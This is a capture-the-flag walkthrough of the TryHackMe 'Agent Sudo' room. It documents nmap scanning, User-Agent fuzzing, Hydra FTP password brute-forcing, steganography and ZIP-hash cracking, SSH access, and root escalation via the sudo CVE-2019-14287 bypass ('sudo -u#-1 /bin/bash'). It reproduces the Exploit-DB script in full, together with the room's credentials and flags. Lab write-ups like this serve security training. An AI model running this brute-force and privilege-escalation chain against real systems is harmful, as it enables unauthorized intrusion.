# Room Information

Room link: https://tryhackme.com/room/agentsudoctf

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/04/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine, as well as our AttackBox on TryHackMe
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.226.141 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-01 04:00 BST
Nmap scan report for ip-10-10-226-141.eu-west-1.compute.internal (10.10.226.141)
Host is up (0.00091s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:6A:D9:B1:0E:FB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

#
> Inspecting the Web Pages
4. `curl http://{TARGET IP}` to retrieve the data of the target's homepage 
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.226.141

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

#
> Testing User Agents Using Burp Suite
5. Start up Burpsuite Community Edition

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Burpsuite%20Dashboard.png)

6. Launch Firefox, turn on FoxyProxy, which was already set up by TryHackMe, to allow Burpsuite to capture our web requests and responses

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/FoxyProxy.png)

8. Seeing that the homepage message was signed by an agent called "**R**", we can send a web request and replace the **User-Agent** value on our intercepted web request to "**R**", which ended displaying the same message that we got before but this time with an error message, which probably indicates that the users' User-Agents are probably also letters of the alphabet as well

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Page%20Intercept.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20R%20.png) 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Agent%20R.png)

9. We'll try this theory out by capturing the same web request again but this time we'll send it to Burpsuite's Intruder module and then from there, we'll create a list containing all the capital letters of the alphabet and use it as a payload that we'll inject into our captured web request in the **User-Agent** field

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20Payload%20List.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Payload%20Position.png)

10. After running our attack, we can see that one of the letters in our payload list got a 302 HTTP status code, meaning that the user has been redirected to another location

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Attack%20Results.png)

11. We'll create and intercept another web request to the target's homepage but this time we'll replace the User-Agent with the one from our payload list that got the 302 HTTP status code, which ended up redirecting us to a PHP file with its contents displayed onto our browser, which ended up containing the User Agent's name and a message that said that their password is weak

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20Payload%20List.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/User-Agent%20C.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/agent_C_attention.png)

#
> Password Guessing Using Hydra
12. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}` to launch a password guessing attack to try to guess the password for the user we discovered, which in ended up working
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 14:01:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.55.185:21/
[21][ftp] host: 10.10.55.185   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
```

#
> Scanning the Target's FTP Server
13. `ftp {USER1}@{TARGET IP}` to log in to the target's FTP server using the set of credentials that we now have
```bash
┌──(kali㉿kali)-[~]
└─$ ftp chris@10.10.75.108 
Connected to 10.10.75.108.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
14. `ls` to list the available files and directories, also known as shares, that are in the current remote directory onto our terminal, which revealed there to be three files
15. `get {FILE1}` to retrieve the first file from the FTP server and download a copy of that file onto our local attack machine
16. `get {FILE2}` to retrieve the second file from the FTP server and download a copy of that file onto our local attack machine
17. `get {FILE3}` to retrieve the third file from the FTP server and download a copy of that file onto our local attack machine
18. `exit` to terminate the FTP session and disconnect from the target's FTP server
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
```bash
ftp> get To_agentJ.txt cutie-alien.jpg cutie.png
local: cutie-alien.jpg remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (63.0884 kB/s)
```
```bash
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (2.9148 MB/s)
```
```bash
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.00 secs (26.3178 MB/s)
```
```bash
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.00 secs (89.8052 MB/s)
```
```bash
ftp> exit
221 Goodbye.
```

#
> Inspecting the Retrieved Images Using Steghide and Binwalk
19. `cat {FILE1}.txt` to display the contents of the first file we downloaded from the target's FTP server onto our terminal, which displayed a message from one of the target's agents that's directed to one of its other agents
```bash
┌──(kali㉿kali)-[~]
└─$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
20. `steghide --info {FILE2}.jpg` to display potentially hidden data from the JPG image that was hidden using steganopgraphy, which ended up prompting us for a passphrase, which we don't have
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
21. `binwalk {FILE2}.jpg` to analyze the JPG image for any embedded or hidden content, which revealed nothing 
22. `binwalk {FILE3}.png` to analyze the PNG image for any embedded or hidden content, which revealed an encrypted ZIP file embedded into the image
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
23. `binwalk {FILE3}.png --extract` to extract the embedded ZIP file from the JPG image
24. `ls` to check if the contents were successfully extracted, which they were
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png --extract

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
```bash
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
To_agentJ.txt
```

#
> Cracking the ZIP Archive's Password Hash Using John the Ripper
25. `cd {EXTRACTED DIRECTORY}` to change to the extracted data from the PNG image's directory
26. `ls` to display the available files and directories within our current working directory, which revealed a ZIP file and a text file
```bash
┌──(kali㉿kali)-[~]
└─$ cd _cutie.png.extracted/
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365
365.zlib
8702.zip
To_agentJtxt
```
27. `zip2john {ZIP FILE} > {FILENAME2}.txt` to extract the encrypted ZIP file's password hash and redirect it to a text file
28. `john {FILENAME2}.txt` to crack the password hash that we extracted from the ZIP file using John the Ripper's default wordlist, which ended up cracking the password
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ zip2john 8702.zip > Hash.txt
```
```bash    
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ john Hash.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:02 DONE 2/3 (2023-07-01 12:34) 0.4784g/s 21265p/s 21265c/s 21265C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#
> Extracting the Embedded Files From the Retrieved Images
29. `7z e 8702.zip` to extract the contents from the ZIP archive, which ended up prompting us for a password, which ended up being the password of the password hash that we just cracked using John the Ripper
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```
30. `ls` to verify if the text file was successfully extracted from the ZIP archive, which it was 
31. `cat {FILE4}.txt` to output the contents of the text file that we just extracted onto our terminal, which ended up displaying another message from another agent containing what seems like an encoded string
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  Hash.txt  To_agentJ.txt  To_agentR.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
32. `echo '{STRING}' > {FILENAME3}.txt` to write the encoded string into a text file
33. `base64 {FILENAME3}.txt --decode` to decode the encoded string using base64, which ended up decoding it back to plaintext and displaying it onto our terminal
34. `cd ..` to change back to the previous directory we were in where the retrieved images are in
35. `steghide --info {FILE2}.jpg` to display potentially hidden data from the JPG image that was hidden using steganopgraphy by using the decoded string as the passphrase to display its hidden contents
36. `steghide --extract -sf {FILE1}` to extract the hidden data that was embedded into the JPG image using the decoded string as the passphrase, which ended up extracting a text file
37. `ls` to verify if the text file was successfully extracted from the JPG image, which it was
38. `cat {FILE5}` to display the extracted text file's contents onto our terminal, which contained a new set of credentials that we could use to connect to the target
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ echo 'QXJlYTUx' > String.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ base64 String.txt --decode
Area51
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cd .. 
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```
```bash
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
message.txt
To_agentJ.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat message.txt                         
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

#
> Connecting to the Target Using SSH  
39. `ssh {USER2}@{TARGET IP}` to connect to the target's SSH server using the new set of credentials that we now have, which successfully logged us in
```bash
┌──(kali㉿kali)-[~]
└─$ ssh james@10.10.75.108      
james@10.10.75.108's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  1 17:24:23 UTC 2023

  System load:  0.0               Processes:           94
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 15%               IP address for eth0: 10.10.75.108
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
```
40. `ls` to list the available files and directories that are in our current working directory, which contained a JPG image and a user text file
41. `cat {FILE6}.txt` to display the contents of the user text file onto our terminal, which contained the user flag for this challenge
```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```
```bash
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```
42. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}` to securely copy the JPG image we found on the compromised machine onto our local attack machine, which we'll then reverse search on Google to find what incident that the JPG image is referring to
```bash
┌──(kali㉿kali)-[/]
└─$ sudo scp james@10.10.75.108:/home/james/Alien_autospy.jpg ~/ 
The authenticity of host '10.10.75.108 (10.10.75.108)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:2: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.75.108' (ED25519) to the list of known hosts.
james@10.10.75.108's password: 
Alien_autospy.jpg                                                                 100%   41KB 115.7KB/s   00:00   
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Google%20Reverse%20Search.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Reverse%20Image%20Search%20Results.png)

# Vulnerability Identification
> Vulnerability Identification Using Searchsploit
43. `sudo -l` to list the privileges and permissions that are granted to the current user that we're running as, which revealed that they can start an interactive instance of the Bash shell without needing the root's password
44. `sudo -V` to displat the version information and configuration details of the **sudo** command onto our terminal
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
```bash
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
45. `searchsploit sudo 1.8.2` to search for exploits related to version 1.8.2 of the sudo program, which displayed six exploit modules but the one that seems the most relevant to our situation is the last one, which is the one we'll be using
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit --verbose sudo 1.8.2
[i] Version ID: 1.8.2
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Esca | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                             | linux/dos/18436.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                 | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                      | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                    | linux/local/47502.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# Vulnerability Exploitation
> Vulnerability Exploitation Using Sudo
46. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"` to retrieving and display the content of the exploit's Python script from the Exploit-DB onto our terminal, which revealed a code sequence that could use to elevate our privileges within the target's compromised system
```bash
┌──(kali㉿kali)-[~]
└─$ curl https://www.exploit-db.com/raw/47502
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.8.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''


#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```
47. `sudo -u#-1 /bin/bash` to run a Bash shell with the user ID -1
48. `whoami` to verify if we're running as root, which we are
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```
```bash
root@agent-sudo:~# whoami
root
```
49. `find / -type f -name "root*" 2>/dev/null` to search for any file within the entire file system ("/") starting with "root" and display the path for any matching files while suppressing any error messages that may occur to the /dev/null file during the search
50. `cat {ROOT FILE PATH}` to display the contents of the root text file onto our terminal, which ended up containing the root flag for this challenge
```bash
root@agent-sudo:~# find / -type f -name "root*" 2>/dev/null
/lib/recovery-mode/options/root
/usr/lib/python3/dist-packages/twisted/names/root.py
/usr/lib/python3/dist-packages/twisted/names/__pycache__/root.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/python/roots.py
/usr/lib/python3/dist-packages/twisted/python/__pycache__/roots.cpython-36.pyc
/usr/src/linux-headers-4.15.0-55/include/linux/root_dev.h
/usr/share/dns/root.hints
/usr/share/dns/root.key
/usr/share/dns/root.ds
/usr/share/apport/root_info_wrapper
/root/root.txt
/proc/sys/kernel/keys/root_maxbytes
/proc/sys/kernel/keys/root_maxkeys
```
```bash
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```


**Room completed!**

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Agent%20Sudo.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `curl http://{TARGET IP}`
4. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}`
5. `ftp {USER1}@{TARGET IP}`
6. `ls`
7. `get {FILE1}`
8. `get {FILE2}`
9. `get {FILE3}`
10. `exit`
11. `cat {FILE1}.txt`
12. `steghide --info {FILE2}.jpg`
13. `binwalk {FILE2}.jpg`
14. `binwalk {FILE3}.png`
15. `binwalk {FILE3}.png --extract`
16. `ls`
17. `cd {EXTRACTED DIRECTORY}`
18. `ls`
19. `zip2john {ZIP FILE} > {FILENAME2}.txt`
20. `john {FILENAME2}.txt`
21. `7z e 8702.zip`
22. `ls`
23. `cat {FILE4}.txt`
24. `echo '{STRING}' > {FILENAME3}.txt`
25. `base64 {FILENAME3}.txt --decode`
26. `cd ..`
27. `steghide --info {FILE2}.jpg`
28. `steghide --extract -sf {FILE1}`
29. `ls`
30. `cat {FILE5}`
31. `ssh {USER2}@{TARGET IP}`
32. `ls`
33. `cat {FILE6}.txt`
34. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}`
35. `sudo -l`
36. `sudo -V`
37. `searchsploit sudo 1.8.2`
38. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
39. `sudo -u#-1 /bin/bash`
40. `whoami`
41. `find / -type f -name "root*" 2>/dev/null`
42. `cat {ROOT FILE PATH}`

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file

# Contributions
This writeup was written by Jonmar Corpuz.

Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/
